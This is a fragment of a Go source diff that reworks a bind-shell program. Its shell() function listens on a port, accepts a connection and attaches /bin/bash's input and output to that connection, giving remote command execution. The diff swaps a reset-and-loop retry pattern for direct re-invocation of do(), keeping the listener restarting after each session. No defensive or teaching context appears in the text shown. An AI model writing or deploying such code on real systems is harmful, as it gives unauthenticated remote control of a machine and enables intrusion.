@@ -22,11 +22,6 @@ func do() {
 	shell()
 }
 
-func reset() {
-	time.Sleep(1 * time.Second)
-	do()
-}
-
 func getPort(i int, p string) string {
 	i++
 	if i > 3 {
@@ -46,7 +41,7 @@ func shell() {
 	if err != nil {
 		fmt.Println(err.Error())
 		list.Close()
-		reset()
+		do()
 		return
 	}
 	con, err := list.Accept()
@@ -54,17 +49,17 @@ func shell() {
 		fmt.Println(err.Error())
 		list.Close()
 		con.Close()
-		reset()
+		do()
 		return
 	}
 	fmt.Println("Connection established")
-	for {
-		cmd := exec.Command("/bin/bash")
-		//Set input/output to the established connection's in/out
-		cmd.Stdin = con
-		cmd.Stdout = con
-		cmd.Stderr = con
-		cmd.Run()
-		fmt.Println("Disconnected")
-	}
+	cmd := exec.Command("/bin/bash")
+	//Set input/output to the established connection's in/out
+	cmd.Stdin = con
+	cmd.Stdout = con
+	cmd.Stderr = con
+	cmd.Run()
+	list.Close()
+	con.Close()
+	do()
 }
